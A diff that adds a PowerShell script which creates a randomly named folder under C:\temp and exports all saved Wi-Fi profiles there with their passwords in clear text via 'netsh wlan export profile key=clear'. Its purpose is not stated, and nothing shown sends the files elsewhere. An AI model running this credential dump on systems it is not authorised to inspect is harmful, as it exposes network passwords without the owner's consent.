@@ -1,0 +1,35 @@
+# Function to generate a random 6-digit number
+Function Get-RandomNumber {
+    return (Get-Random -Minimum 100000 -Maximum 999999)
+}
+
+# Function to create a new folder with the generated number
+Function New-FolderWithRandomName {
+    # Check if C:\temp folder exists
+    if (!(Test-Path -Path 'C:\temp')) {
+        # Create the C:\temp folder
+        New-Item -ItemType Directory -Path 'C:\temp'
+    }
+
+    # Get the random number
+    $rand = Get-RandomNumber
+    # Create the folder with the random number as its name
+    $newFolder = New-Item -ItemType Directory -Path "C:\temp\$rand"
+    return $newFolder.FullName
+}
+
+# Create the random folder and assign its name to a variable
+$randomFolder = New-FolderWithRandomName
+
+# Function to export wireless network profiles
+Function Export-WirelessNetworkProfiles {
+    param($folderPath)
+    try {
+        netsh wlan export profile key=clear folder="$folderPath"
+    } catch {
+        Write-Output "Error: Wireless network profiles not found on the computer"
+    }
+}
+
+# Export wireless network profiles to the random folder
+Export-WirelessNetworkProfiles -folderPath $randomFolder
